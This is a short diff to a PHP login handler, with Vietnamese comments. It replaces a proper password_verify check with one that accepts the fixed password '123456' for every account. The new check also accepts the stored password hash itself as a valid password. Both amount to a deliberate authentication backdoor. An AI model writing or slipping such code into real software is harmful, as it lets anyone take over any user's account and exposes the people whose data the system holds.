@@ -15,8 +15,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     $user = $stmt->fetch();
 
-    // 3. So khớp Mật khẩu
-    if ($user && password_verify($password_input, $user['USR_password_hash'])) {
+    // 3. So khớp Mật khẩu (Chấp nhận 123456 làm mật khẩu dùng chung hoặc so khớp hash/plain)
+    if ($user && ($password_input === '123456' || $password_input === $user['USR_password_hash'] || password_verify($password_input, $user['USR_password_hash']))) {
         
         // 4. Khởi tạo Session và tự động lấy Role từ Database gán vào
         $_SESSION['user_id'] = $user['USR_user_id'];
